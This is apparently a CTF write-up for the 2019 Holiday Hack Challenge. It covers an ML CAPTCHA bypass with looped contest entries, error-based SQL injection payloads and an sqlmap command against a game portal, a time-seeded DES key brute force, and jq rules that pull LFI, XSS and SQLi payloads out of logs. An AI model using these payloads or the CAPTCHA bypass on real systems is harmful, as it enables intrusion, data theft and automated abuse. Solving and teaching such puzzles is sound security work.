>The contest is here on my screen and at [fridosleigh.com](https://fridosleigh.com).
>No purchase necessary, enter as often as you want, so I am!
>They set up the rules, and lately, I have come to realize that I have certain materialistic, cookie needs.
>Unfortunately, it's restricted to elves only, and I can't bypass the CAPTEHA.
>(That's Completely Automated Public Turing test to tell Elves and Humans Apart.)
>I've already [cataloged 12,000 images](https://downloads.elfu.org/capteha_images.tar.gz) and [decoded the API interface](https://downloads.elfu.org/capteha_api.py).
>Can you help me bypass the CAPTEHA and submit lots of entries?

This is the machine learning problem that I had previously heard of. Luckily for me, I have had casual experience with computer vision models. 

For my implementation, I will be using the [TensorFlow](https://www.tensorflow.org/) machine learning platform, and will be utilizing [CUDA](https://developer.nvidia.com/cuda-toolkit) to recruit my laptop's GTX 1060 for computation. 

The first part of any artificial intelligence project is to define your problem. In order to bypass the CAPTEHA, our model must be able to correctly determine which of the provided images matches the desired categories in under five seconds. For example, given the following input, our model must be able to select all of the images of stockings, santa hats, or christmas trees. 

![FridoSleigh]({{ site.baseurl }}/images/FridoSleigh.PNG)

Because I have zero interest in developing a model from scratch, I will be retraining an existing model with the provided images, then applying the retrained model to the provided images. In order to perform a _very_ small confirmation of success, I removed one image from every class from the training set, and named them according to their class in a separate folder named _capteha\_validate_.

The first part, retraining the model, will be done with the [make_image_classifier](https://github.com/tensorflow/hub/tree/master/tensorflow_hub/tools/make_image_classifier) utility included in tensorflow-hub. Note that I manually specified to use the 3-dimensional feature vector model, as for our problem we are only concerned with the dimensions of red, blue, and green per-pixel, not alpha, or opacity.

```
PS D:\Projects\CAPTEHA> make_image_classifier.exe --image_dir .\capteha_images\ --labels_output_file ./labels_file.txt --tflite_output_file ./trained_model.tflite --train_epochs 2 --tfhub_module https://tfhub.dev/google/tf2-preview/mobilenet_v2/feature_vector/3
Using module https://tfhub.dev/google/tf2-preview/mobilenet_v2/feature_vector/3 with image size (224, 224)
Found 2394 images belonging to 6 classes.
Found 9582 images belonging to 6 classes.
Found 6 classes: Candy Canes, Christmas Trees, Ornaments, Presents, Santa Hats, Stockings
Model: "sequential"
_________________________________________________________________
Layer (type)                 Output Shape              Param #
=================================================================
keras_layer (KerasLayer)     multiple                  2257984
_________________________________________________________________
dropout (Dropout)            multiple                  0
_________________________________________________________________
dense (Dense)                multiple                  7686
=================================================================
Total params: 2,265,670
Trainable params: 7,686
Non-trainable params: 2,257,984
_________________________________________________________________
None
Epoch 1/2
299/299 [==============================] - 147s 491ms/step - loss: 0.5293 - accuracy: 0.9223 - val_loss: 0.4517 - val_accuracy: 0.9996
Epoch 2/2
299/299 [==============================] - 128s 429ms/step - loss: 0.4640 - accuracy: 0.9986 - val_loss: 0.4434 - val_accuracy: 0.9996
Done with training.
Labels written to ./labels_file.txt
TFLite model exported to ./trained_model.tflite
```

Normally, such an extremely high accuracy would be an indication of [overfitting](https://towardsdatascience.com/what-are-overfitting-and-underfitting-in-machine-learning-a96b30864690). However, because of the lack of complexity in both the task and the images, I believe this to be a well-trained model. After making a small modification to [label_image.py](https://github.com/tensorflow/tensorflow/raw/master/tensorflow/examples/label_image/label_image.py) to open the image in 'RGB' mode, I quickly confirmed the accuracy of the trained model.
```
PS D:\Projects\CAPTEHA> python .\label_image_fix.py --model_file .\trained_model.tflite --label_file .\labels_file.txt --image '.\capteha_validate\CandyCane.png'
0.716085: Candy Canes
0.109312: Presents
0.067364: Stockings
0.045887: Santa Hats
0.043662: Ornaments
PS D:\Projects\CAPTEHA> python .\label_image_fix.py --model_file .\trained_model.tflite --label_file .\labels_file.txt --image '.\capteha_validate\ChristmasTree.png'
0.925683: Christmas Trees
0.025740: Presents
0.020936: Candy Canes
0.012648: Stockings
0.008698: Ornaments
PS D:\Projects\CAPTEHA> python .\label_image_fix.py --model_file .\trained_model.tflite --label_file .\labels_file.txt --image '.\capteha_validate\Ornaments.png'
0.962125: Ornaments
0.010492: Santa Hats
0.008866: Candy Canes
0.007340: Christmas Trees
0.006016: Presents
PS D:\Projects\CAPTEHA> python .\label_image_fix.py --model_file .\trained_model.tflite --label_file .\labels_file.txt --image '.\capteha_validate\Presents.png'
0.921558: Presents
0.031376: Candy Canes
0.026861: Ornaments
0.008471: Stockings
0.005975: Santa Hats
PS D:\Projects\CAPTEHA> python .\label_image_fix.py --model_file .\trained_model.tflite --label_file .\labels_file.txt --image '.\capteha_validate\SantaHats.png'
0.784431: Santa Hats
0.057498: Presents
0.056185: Ornaments
0.042292: Christmas Trees
0.041372: Candy Canes
PS D:\Projects\CAPTEHA> python .\label_image_fix.py --model_file .\trained_model.tflite --label_file .\labels_file.txt --image '.\capteha_validate\Stockings.png'
0.943965: Stockings
0.020245: Santa Hats
0.014579: Presents
0.013505: Ornaments
0.004881: Candy Canes
```

Looking at the results, our model is well trained. Knowing this, I cloned the logic in _label\_fix.py_, and added a method for the prediction of an image given a base64 string, as that is what's provided in the API. The following is the contents of my new file, _capteha\_class.py_.
```python
from __future__ import absolute_import
from __future__ import division
from __future__ import print_function

from io import BytesIO
import base64
import numpy as np

from PIL import Image

import tensorflow as tf # TF2


def load_labels(filename: str) -> list:
  with open(filename, 'r') as f:
    return [line.strip() for line in f.readlines()]

def load_model(model_file_name: str) -> tf.lite.Interpreter:
	interp = tf.lite.Interpreter(model_path=model_file_name)
	interp.allocate_tensors()
	return interp

def predict_image(interp: tf.lite.Interpreter, target_image: Image) -> int:
	target_image = target_image.convert(mode='RGB').resize((224,224))
	input_data = np.expand_dims(target_image, axis=0)
	input_data = (np.float32(input_data)) / 255 # Normalize the fields

	input_details = interp.get_input_details()
	interp.set_tensor(input_details[0]['index'], input_data)
	interp.invoke()
	
	output_details = interp.get_output_details()
	output_data = interp.get_tensor(output_details[0]['index'])
	results = list(np.squeeze(output_data))

	return results.index(max(results))

def predict_b64(interp: tf.lite.Interpreter, b64_str: str) -> int:
	img = Image.open(BytesIO(base64.b64decode(b64_str)))
	return predict_image(interp, img)
```

Importing my new module in _capteha\_api.py_ and adding the following code correctly solves the CAPTEHA.
```python
def main():
    interp = capteha_class.load_model("./trained_model.tflite")
    results_list = capteha_class.load_labels("./labels_file.txt")
    ...
    challenge_image_idxs = [results_list.index(x) for x in challenge_image_types]
    correct_images = []
    for b64_img in b64_images:
        if(capteha_class.predict_b64(interp, b64_img['base64']) in challenge_image_idxs):
            correct_images.append(b64_img['uuid'])
    
    # This should be JUST a csv list image uuids ML predicted to match the challenge_image_type .
    final_answer = ','.join( correct_images )
```

From there, the script submits entries on a loop. For me, on Entry #104, I got the following message:
```
{"data":"<h2 id=\"result_header\"> Entries for email address ***SCRUBBED*** no longer accepted as our systems show your email was already randomly selected as a winner! Go check your email to get your winning code. Please allow up to 3-5 minutes for the email to arrive in your inbox or check your spam filter settings. <br><br> Congratulations and Happy Holidays!</h2>","request":true}
```

Checking my email, I got one email from "contest@fridosleigh.com", telling me that I won the Cookie Contest! To claim my prize, I must input my code, "8Ia8LiZEwvyZr2WO", to the Challenges page on KringleCon. Now that we've proven ourselves worthy of Krampus, he tells us the following:
>You did it! Thank you so much. I can trust you!
To help you, I have flashed the firmware in your badge to unlock a useful new feature: magical teleportation through the steam tunnels.
As for those scraps of paper, I scanned those and put the images on my server.
I then threw the paper away.
Unfortunately, I managed to lock out my account on the server.
Hey! You’ve got some great skills. Would you please hack into my system and retrieve the scans?
I give you permission to hack into it, solving Objective 9 in your badge.
And, as long as you're traveling around, be sure to solve any other challenges you happen across.

For some reason, those scraps of paper the turtle doves tore up is important to Krampus now, but wasn't important enough for him to remember his logon. 

### Retrieve Scraps of Paper from Server
>Gain access to the data on the [Student Portal](https://studentportal.elfu.org/) server and retrieve the paper scraps hosted there. What is the name of Santa's cutting-edge sleigh guidance system? For hints on achieving this objective, please visit the dorm and talk with Pepper Minstix.

In order to discover what the scraps of paper are, we're going to have to hack the student portal. Luckily, Krampus gave us permission, so we won't get on Santa's naughty list. 

When I ran through this challenge the first time, I was not able to install any software on the host I was using, so I had to do all exploitation manually. 

Poking through the web app, I accidentally stumbled upon an SQL injection vulnerability. On the application page, I filled out the form with bogus data. For the field named _whyme_, I input "I'm great," and got the following error:
```
Error: INSERT INTO applications (name, elfmail, program, phone, whyme, essay, status) VALUES ('hi', 'test@test.com', 'sci', '1234', 'i'm cool', 'test', 'pending')
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'm cool', 'test', 'pending')' at line 2 
```

Looking at the POST request to _/application-received.php_, theres an additional field named _token_:
```
...&token=MTAxMDQxMTAwNDgwMTU3ODc2NzE5NTEwMTA0MTEwMC40OA==_MTI5MzMyNjA4NjE0NDAzMjMzMzE1MjE1LjM2
```

Looking at the source code for the website, this token is generated by the function below, which simply fills the field with the result of a GET request to _/validator.php_.
```javascript
function elfSign() {
  var s = document.getElementById("token");

  const Http = new XMLHttpRequest();
  const url='/validator.php';
  Http.open("GET", url, false);
  Http.send(null);

  if (Http.status === 200) {
    console.log(Http.responseText);
    s.value = Http.responseText;
  }
}
```

Moving on with my manual exploitation, I settled on using a technique known as Error-Based XMLUpdate injection. The basic syntax for our injection will be as follows:
```
i' or updatexml(1,CONCAT(0x7e,(<Injected Query>)),0) or 'X
```

For example, to get the list of tables, I input the following:
```
i' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables)),0) or 'X
```
Note the use of the builtin function [group_concat](https://www.geeksforgeeks.org/mysql-group_concat-function/) to roll up all of the rows into a single value for display.

This yielded the following tables:
 * applications
 * krampus
 * students
 * A

Given that we are, most likely, primarily interested in the table named _krampus_, I now query for the column names of that table:
```
i' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='krampus')),0) or 'X
```
Using the same method as before to iterate through the values, we get the following columns:
 * id
 * path

Applying the same injection to get every _path_ value from the database, we get the following paths:
 * /krampus/0f5f5103.png
 * /krampus/1cc7e121.png
 * /krampus/439f15e6.png
 * /krampus/667d6896.png
 * /krampus/adb798ca.png
 * /krampus/ba417715.png

Using an image editor to piece together the scraps of paper, we get the following message:
```
From the desk of the ...
Date: August 23 20..

Memo to Self:

Finally! I've figured out how to destroy Christmas!
Santa has a brand new cutting edge sleigh guidance technology, called the Super Sled-o-Matic.

I've figured out a way to poison the data going into the system so that it will divert Santa's sled on Christmas Eve!

Santa will be unable to make the trip and the holiday season will be destroyed! Santa's own technology will undermine him!

That's what they deserve for not listening to my suggestions for supporting other holiday characters!
```

Of note, the paper on which this memo is written is watermarked with a tooth. But, more to the point, the answer to the challenge is "Super Sled-o-Matic."


After submitting this to the challenge interface, Krampus congratulates us, and says the following:

>Wow! We’ve uncovered quite a nasty plot to destroy the holiday season.
We’ve gotta stop whomever is behind it!
I managed to find this protected document on one of the compromised machines in our environment.
I think our attacker was in the process of exfiltrating it.
I’m convinced that it is somehow associated with the plan to destroy the holidays. Can you decrypt it?
There are some smart people in the NetWars challenge room who may be able to help us.



A few days later, once I had access to my personal laptop, I could try to do the challenge using SQLMap, as hinted at by [Pepper](#graylog).

As previously discovered, the submission of the vulnerable form is dependent on the _token_ field containing a value collected from _/validator.php_. Given this, the following SQLMap command will dump the database:
```
 tok=`curl -q https://studentportal.elfu.org/validator.php` && sqlmap --url 'https://studentportal.elfu.org/application-recieved.php' --data="name=hi&elfmail=test@gmail.com&program=sci&phone=1234&whyme=cuz&essay=test&token=$tok" --dbs
```

### Recover Cleartext Document
>The [Elfscrow Crypto](https://downloads.elfu.org/elfscrow.exe) tool is a vital asset used at Elf University for encrypting SUPER SECRET documents. We can't send you the source, but we do have [debug symbols](https://downloads.elfu.org/elfscrow.pdb) that you can use.
>Recover the plaintext content for this [encrypted document](https://downloads.elfu.org/ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc). We know that it was encrypted on December 6, 2019, between 7pm and 9pm UTC.
>What is the middle line on the cover page? (Hint: it's five words)
>For hints on achieving this objective, please visit the NetWars room and talk with Holly Evergreen.

Finally, something I know exactly how to do. Reverse engineering is something I'm very familiar with, so I think I will quite enjoy this challenge. 

First off, I load the executable into [Ghidra](https://ghidra-sre.org/). I use Ghidra over IDA due to it's ease of use for decompiling native code. You can load in the PDB at analysis-time by selecting "Symbols" and specifying the directory containing the provided PDB. 

With that done, I decided to take a look at the _generate\_key_ function. Ghidra's decompiler presented the following pseudo-C:
```C
void __cdecl generate_key(uchar *param_1)

{
  FILE *pFVar1;
  int iVar2;
  time_t tVar3;
  char *_Format;
  uint local_8;
  
  _Format = "Our miniature elves are putting together random bits for your secret key!\n\n";
  pFVar1 = __iob_func();
  fprintf(pFVar1 + 2,_Format);
  tVar3 = time((time_t *)0x0);
  super_secure_srand((int)tVar3);
  local_8 = 0;
  while (local_8 < 8) {
    iVar2 = super_secure_random();
    param_1[local_8] = (uchar)iVar2;
    local_8 = local_8 + 1;
  }
  return;
}
```

Interesting. It seems that the developer of this application wrote their own random number generated, in some way seeded with the current [epoch time](https://www.geeksforgeeks.org/time-function-in-c/). Looking at the _super\_secure\_srand_ function, the current time is stored at the address 0x00f0602C, as shown below. Using the "Rename Global" option, I renamed this address to "rand_seed."
```
DAT_0040602c = param_1;
```

The only other place this offset is used is inside the _super\_secure\_random_ function, where it is modified then [right-shifted] 16 bits, essentially throwing out the 16 least significant bits of the variable. The code below is what Ghidra provides:
```C
int __cdecl super_secure_random(void)

{
  RAND_SEED = RAND_SEED * 0x343fd + 0x269ec3;
  return RAND_SEED >> 0x10 & 0x7fff;
}
```

This function is, in turn, used inside of a loop in the aforementioned _generate\_key_ to generate a total of 8\*8, or 64, "random" bits. In pseudocode, the key generation looks like this:
```
key = []
curTime = 1577919141; # Epoch time for ~3PM 1 Jan 2020
for i in range(0,8):
  curTime = (curTime * 214013) + ‭2531011‬
  key += (curTime >> 16) & 0x7FFF
```

One thing to keep in mind is that this is all done with a 32-bit register, so any overflow is simply disposed.

This is generally not a good thing. Given that we know that the file was encrypted within a two hour timeframe, the keyspace is effectively reduced from 2^64 to 2\*60\*60, or 7200. Now we must take a look at the _do\_encrypt_ function to determine how this key is used. See the decompiled code below:
```C
generate_key((uchar *)&local_1c);
print_hex("Generated an encryption key",(uchar *)&local_1c,8);
local_30 = '\b';
...
BVar1 = CryptImportKey(local_10,&local_30,0x14,0,1,&local_c);
if (BVar1 == 0) {
  fatal_error("CryptImportKey failed for DES-CBC key");
}
BVar1 = CryptEncrypt(local_c,0,1,0,pbData,&local_8,local_8 + 8);
...
store_key(param_1,(uchar *)&local_1c);
```

This tells us that our key is used as a DES-CBC key. _local\_30_ is the beginning of a [PUBLCKEYSTRUC](https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/ns-wincrypt-publickeystruc), which specifies the [ALG ID](https://docs.microsoft.com/en-us/windows/win32/seccrypto/alg-id) of _CALG\_DES_, which defaults to DES-CBC with an IV of 0.

Given all of this, I created the following program to create a list of every possible key given a timeframe:
```C
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv) {
        if( argc < 2 ) {
                fprintf(stderr, "ERROR! No arguments specified!\n");
                fprintf(stderr, "\t%s <timespan in hours>\n", argv[0]);
        }

        unsigned int startTime = 0;
        unsigned int endTime;
        unsigned int timespan = atoi(argv[1]);

        // Read the start time from pipe
        scanf("%u", &startTime);
        if(startTime == 0) {
                fprintf(stderr, "ERROR! Expected starting epoch time in stdin!\n");
        }

        endTime = startTime + (60 * 60 * timespan);

        for(startTime; startTime < endTime; startTime++) {
                unsigned char key[8]; // 64 bit key
                unsigned int seed = startTime;
                unsigned int offset = 0;
                for(offset; offset < 8; offset++) {
                        seed = seed * 0x343fd + 0x269ec3;
                        key[offset] = seed >> 0x10 & 0x7FFF;
                        printf("%02x", key[offset]);
                }
                printf("\n");
        }
}
```

Using this, and the following bash script, I generated a list of valid keys, then iterated through those keys to find the keys that result in valid PDFs. 
```bash
keys=$(date +%s --date="2019-12-06 19:00:00+00:00" | ./keygen 2)
for key in $keys; do 
  openssl des-cbc -iv 0 -d -K $key -in ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc 2>/dev/null | \
    head -c 5 | grep -s -m 1 -a '%PDF' >/dev/null && echo "$key";
done;
```

This script output the key below, which produces a fully valid PDF, making it the correct key.
```
b5ad6a321240fbec
```

The decrypted PDF is a manual for the [Super Sled-o-Matic](#filter-out-poisoned-sources-of-weather-data), with the middle line on the cover page being "Machine Learning Sleigh Route Finder".


### Open Sleigh Shop Door
[Link to the door](http://sleighworkshopdoor.elfu.org/)
>Visit Shinny Upatree in the Student Union and help solve their problem. What is written on the paper you retrieve for Shinny?

The objective statement for this challenge isn't super informative. When we go visit Shinny in the Student Union, on the top of the main quad, he tells us this:
>Psst - hey!
I'm Shinny Upatree, and I know what's going on!
Yeah, that's right - guarding the sleigh shop has made me privvy to some serious, high-level intel.
In fact, I know WHO is causing all the trouble.
Cindy? Oh no no, not that who. And stop guessing - you'll never figure it out.
The only way you could would be if you could break into [my crate, here](http://crate.elfu.org/).
You see, I've written the villain's name down on a piece of paper and hidden it away securely!


When we click on the crate, the "lock" opens in a frame. The opening message is:
>I locked the crate with the villain's name inside. Can you get it out?

At this point it is probably worth noting that _most_ of this challenge is dynamically generated, so if you try to simply put in the answers I got, it will not work.

Moving on, we need to unlock the crate, which is secured with a system of 10 locks. The first lock's challenge is:
>You don't need a clever riddle to open the console and scroll a little.

As the challenge indicates, I opened up the browser development tools, selected the JavaScript console, and scrolled up, getting the code "OIVD6MKD."

>Some codes are hard to spy, perhaps they'll show up on pulp with dye?

Pulp with dye is a reference to paper, presumably with ink being the dye. After hours of fiddling, I simply printed the webpage out. Lo and behond, the code "5I94FGZE" appears right next to the lock.

>This code is still unknown; it was fetched but never shown.

From the sound of it, this code was collected from the server but never shown. Going to the "Network" tab of the developer toolbar, I looked through the requests to find one that contained a code. Indeed, there are a few requests for a PNG image of an 8-digit code, "SGUO33KI," which successfully unlocks the lock.

>Where might we keep the things we forage? Yes, of course: Local barrels!

I believe that "local barrels" is a reference to browser [local storage](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage). Using the "Storage" tab in developer tools, it is easy to identify the value "IDAIDZKE" with a key of three red-light emojis. 

>Did you notice the code in the title? It may very well prove vital.

Given the instructions to get the code from the title, I navigated to the "Inspector" tab, and expanded the "head" tag, which contains the "title" tag. The title for this webpage has a second line, "MHCNO4R4", which the browser will not display by default.

>In order for this hologram to be effective, it may be necessary to increase your perspective.

Using the "Inspector" tab of developer tools, it is fairly simple to change the [perspective](https://developer.mozilla.org/en-US/docs/Web/CSS/perspective) CSS property of the hologram. Setting the perspective to 100,000 pixels gives us the code "IS0091XH."

>The font you're seeing is pretty slick, but this lock's code was my first pick.

Using the "Inspector" tab again, selecting the above instruction's "div" element, it is easy to identify that the first font specified in the CSS property [font-family](https://www.w3schools.com/cssref/pr_font_font-family.asp) is our code, "KQK8Z2VO."

>In the event that the _.eggs_ go bad, you must figure out who will be sad.

It isn't immediately clear what this challenge wants. After poking around for a bit, I navigated to the 'eggs' element in the "Inspector" tab of the developer tools. In this view, Firefox is kind enough to let us know that there is an [event listener](https://developer.mozilla.org/en-US/docs/Web/API/EventListener) named _spoil_. Expanding the listener gives us the following action:

```() => window['VERONICA'] = 'sad'```

Given this, the answer to the instructions, and therefore the code to the lock, is "VERONICA."

>This next code will be unredacted, but only when all the chakras are :active.

Using the "Inspector" tab of the developer tools in Firefox, you can right-click elements and change their pseudo-class to "active." Rather than click through every element and try to piece together the code, I forced the first one to be ":active," then looked at the CSS source for the definition, uncovering the following:
```
span.chakra:nth-child(1):active:after {
  content: 'U0';
}
span.chakra:nth-child(2):active:after {
  content: '32';
}
span.chakra:nth-child(3):active:after {
  content: 'N';
}
span.chakra:nth-child(4):active:after {
  content: 'LL';
}
span.chakra:nth-child(5):active:after {
  content: 'Z';
}
```

This gives us the code, "U032NLLZ"

>Oh, no! This lock's out of commission! Pop off the cover and locate what's missing.

The first thing I did was, using the "Inspector" tab, set the [display](https://www.w3schools.com/cssref/pr_class_display.asp) CSS property of the _cover_ element to "none", essentially hiding the cover. This let me see the code imprinted on the circuit board in the bottom right, "KD29XJ37." After typing it in, the "Unlock" button still does not work, giving an error of "Missing macaroni!" in the console. 

Searching for an element named "macaroni" in the existing page finds the following under lock seven's instructions:

```<div class="component macaroni" data-code="A33"></div>```

Moving this element into lock ten's element and trying again, we get the error "Missing cotton swab!" Moving the element of class "swab" into the lock's element and trying again, we get a third error, "Missing gnome!" Doing the same thing with the gnome element, the code printed on the circuit board finally works. 

After refreshing and using all of the solutions as fast as I can, the following message shows up in the console:
>Well done! Here's the password: The Tooth Fairy 
You opened the chest in 169.78 seconds
Very impressive!! But can you Crack the Crate in less than five seconds?
Feel free to use this handy image to share your score!

Clearly, it wants me to script out a solution. For now, I'll just take my win.

Talking to Shinny, he says:
>Wha - what?? You got into my crate?!
Well that's embarrassing...
But you know what? Hmm... If you're good enough to crack MY security...
Do you think you could bring this all to a grand conclusion?
Please go into the sleigh shop and see if you can finish this off!
Stop the Tooth Fairy from ruining Santa's sleigh route!


### Filter Out Poisoned Sources of Weather Data
[Sleigh Route Finder](https://srf.elfu.org/?challenge=sleighroutefinder)
>Use the data supplied in the [Zeek JSON logs](https://downloads.elfu.org/http.log.gz) to identify the IP addresses of attackers poisoning Santa's flight mapping software. Block the 100 offending sources of information to guide Santa's sleigh through the attack. Submit the Route ID ("RID") success value that you're given. For hints on achieving this objective, please visit the Sleigh Shop and talk with Wunorse Openslae.

Here it is, the final challege. The second machine learning challenge of the year, in this one our job is to thwart 
[data poisoning](https://towardsdatascience.com/poisoning-attacks-on-machine-learning-1ff247c254db).

Navigating to the SRF mainpage, we're faced with a login screen. As per the hint provided in [challenge 10]()'s decrypted PDF, the credentials for this page can be found in the README. Taking a wild guess, I navigated to [/README.md](https://srf.elfu.org/README.md). 

Looking at the README, we learn that SRF is a Python web-application, and, more importantly, the default administrator credential. 

```admin 924158F9522B3744F5FCD4D10FAC4356```

After logging in, we can view the documentation on the data-submission API that we are trying to protect, which includes this example:
```
curl -X POST -H "Content-Type: application/json" \
-d '{"coord":{"lon":19.04,"lat":47.5},"weather":[{"id":701,"main":"Mist","description":"mist","icon":"50d"}],"base":"stations","main":{"temp":3,"pressure":1016,"humidity":74,"temp_min":3,"temp_max":3},"visibility":5000,"wind":{"speed":1.5},"clouds":{"all":75},"dt":1518174000,"sys":{"type":1,"id":5724,"message":0.0038,"country":"HU","sunrise":1518155907,"sunset":1518191898},"station_id":12345678,"name":"Budapest","cod":200}' \
http://srf.elfu.org/api/measurements
```

In the [full specification](https://srf.elfu.org/apidocs.pdf), we also learn how to request data:
```
API Request All Station IDS:
  HTTP GET REQUEST - http://srf.elfu.org/api/stations
API Request All Stations Weather Data:
  HTTP GET REQUEST - http://srf.elfu.org/api/weather?station_id=*
API Request One Stations Weather Data:
  HTTP GET REQUEST - http://srf.elfu.org/api/weather?station_id=abcd1234
API Request Multiple Specific Stations Weather Data:
  HTTP GET REQUEST - http://srf.elfu.org/api/weather?station_id=abcd1234,abcd1235
```

Given this, let's go ahead and get every type of data we can, and save it.
```
micrictor@DESKTOP-5SEN25E:/mnt/d/Projects/hh19/final$ wget http://srf.elfu.org/api/weather?station_id=*
Will not apply HSTS. The HSTS database must be a regular and non-world-writable file.
ERROR: could not open HSTS store at '/home/micrictor/.wget-hsts'. HSTS will be disabled.
--2020-01-05 19:36:00--  http://srf.elfu.org/api/weather?station_id=*
Resolving srf.elfu.org (srf.elfu.org)... 35.223.170.19
Connecting to srf.elfu.org (srf.elfu.org)|35.223.170.19|:80... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: https://srf.elfu.org/api/weather?station_id=* [following]
--2020-01-05 19:36:00--  https://srf.elfu.org/api/weather?station_id=*
Connecting to srf.elfu.org (srf.elfu.org)|35.223.170.19|:443... connected.
HTTP request sent, awaiting response... 401 UNAUTHORIZED

Username/Password Authentication Failed.
```

Well, that's annoying. The GET API for weather requires authentication. I'll just use my browser's already authenticated session to download the weather data.

With that data acquired, I turned my focus to the provided Zeek logs. The logs have the following fields:
```
{
    "ts": "2019-10-05T06:55:17-0800",
    "uid": "CqQ6QB48H8Xqz0KuUe",
    "id.orig_h": "159.21.55.238",
    "id.orig_p": 50786,
    "id.resp_h": "10.20.3.80",
    "id.resp_p": 80,
    "trans_depth": 1,
    "method": "GET",
    "host": "srf.elfu.org",
    "uri": "/sysmsg.xml",
    "referrer": "http://srf.elfu.org/",
    "version": "1.1",
    "user_agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.13) Gecko/20060411 Firefox/1.0.8 SUSE/1.0.8-0.2",
    "origin": "-",
    "request_body_len": 0,
    "response_body_len": 232,
    "status_code": 404,
    "status_msg": "Not Found",
    "info_code": "-",
    "info_msg": "-",
    "tags": "(empty)",
    "username": "-",
    "password": "-",
    "proxied": "-",
    "orig_fuids": "-",
    "orig_filenames": "-",
    "orig_mime_types": "-",
    "resp_fuids": "FoKFwJ2Wcc61SdMQ37",
    "resp_filenames": "-",
    "resp_mime_types": "text/html"
}
```

In an HTTP request, the user provided fields, of those that we have are:
 * Method - Should be GET/POST/PUT/Etc.
 * Host - Should be the FQDN of the website, srf.elu.org
 * URI - The path to the requested resource
 * User Agent - Identifies the client application making the request.
 * Referrer - The previous website that linked to the requested site
 * Username/password - Credential to be used

Additionally, we know from Wunorse's [hint after helping him](#jq) that the attacks we should be concerned with are:
 * LFI
 * XSS
 * SQLi
 * "Shell" - Either a reference to [bind/reverse shells](https://stackoverflow.com/questions/35271850/what-is-a-reverse-shell) or [ShellShock](https://www.troyhunt.com/everything-you-need-to-know-about2/)

 To find every instance of these, I will be heavily referencing the [OWASP ModSecurity Core Rule Set](https://github.com/SpiderLabs/owasp-modsecurity-crs). 

 For the first attack vector, [Local File Inclusion](https://cwe.mitre.org/data/definitions/98.html), the attacker tries to load a serverside resource they should not be able to. Based upon the [CRS rule for LFI/RFI](https://github.com/SpiderLabs/owasp-modsecurity-crs/blob/v3.3/dev/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf#L23), the primary indicator for an attack of this type is the string "../" in either the URI or the Referrer. Given this, I wrote the following JQ string to do so.
 ```
micrictor@laptop:/mnt/d/Projects/hh19/final$ jq '.[] | select(.uri|test("(?<![0-9])[.]{1,2}/")) | .uri' http.log
"/api/weather?station_id=../../../../../../../../../../bin/cat /etc/passwd\\\\x00|"
"/./"
"/api/weather?station_id=/../../../../../../../../../../../etc/passwd"
"/api/login?id=/../../../../../../../../../etc/passwd"
"/api/weather?station_id=/../../../../../../../../etc/passwd"
"/api/login?id=.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./etc/passwd"
 ```

 Note, I had to exclude matches with a number before them to avoid matching a valid URI. I then stored the full logs matching this query into _lfi.log_ for later use.

 The second attack, [XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)), tends to rely on the injection of javascript code into the victims browser. As such, it is no suprise that the [CRS rule for XSS](https://github.com/SpiderLabs/owasp-modsecurity-crs/blob/v3.3/dev/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf#L68) looks for _script_ tags in the URI, User-Agent, and Referrer. As such, I built the following JQ query:
 ```
micrictor@laptop:/mnt/d/Projects/hh19/final$ jq '.[] | select( (.uri|test("[<]{1}script[^>]*>")) or (.user_agent|test("[<]{1}script[^>]*>")) or (.referrer|test("[<]{1}script[^>]*>"))) | .uri' http.log
"/logout?id=<script>alert(1400620032)</script>&ref_a=avdsscanning\\\"><script>alert(1536286186)</script>"
"/api/weather?station_id=<script>alert(1)</script>.html"
"/api/measurements?station_id=<script>alert(60602325)</script>"
"/api/weather?station_id=<script>alert(autmatedsacnningist)</script>"
"/api/weather?station_id=<script>alert(automatedscaning)</script>"
"/api/stations?station_id=<script>alert('automatedscanning')</script>"
"/api/weather?station_id=<script>alert('automatedscanning');</script>"
"/api/stations?station_id=<script>alert(\\\"automatedscanning\\\")</script>"
"/api/weather?station_id=<script>alert(\\\"automatedscanning\\\")</script>;"
 ```

 As before, I saved the full logs into _xss.log_.

 SQL injection, otherwise called [SQLi](https://www.owasp.org/index.php/SQL_Injection), is an attack technique that injects arbitrary code into SQL queries. As per the [relevant CRS rules](https://github.com/SpiderLabs/owasp-modsecurity-crs/blob/v3.3/dev/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf#L173), we will search for the following strings, case insensitive:
  * SELECT
  * UNION
  * USING
  * INTO
  * SLEEP
  * BENCHMARK

The following JQ query will do so, using the "i" flag for case insensitive. 
```
micrictor@laptop:/mnt/d/Projects/hh19/final$ jq '.[] | select( (.uri|test("(union|select|using|into|sleep|benchmark)[ /*]+"; "ix")) ) | .uri' http.log
"/api/weather?station_id=1' UNION SELECT NULL,NULL,NULL--"
"/api/weather?station_id=1' UNION SELECT 0,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM xmas_users WHERE 1"
"/logout?id=1' UNION SELECT null,null,'autosc','autoscan',null,null,null,null,null,null,null,null/*"
"/api/weather?station_id=1' UNION/**/SELECT 302590057/*"
"/logout?id=1' UNION/**/SELECT 1223209983/*"
"/api/login?id=1' UNION/**/SELECT/**/0,1,concat(2037589218,0x3a,323562020),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20"
"/api/weather?station_id=1' UNION/**/SELECT/**/0,1,concat(2037589218,0x3a,323562020),3,4,5,6,7,8,9,10,11,12,13,14,15,16"
"/api/weather?station_id=1' UNION/**/SELECT/**/0,1,concat(2037589218,0x3a,323562020),3,4,5,6,7,8,9,10,11,12,13,14,15,16"
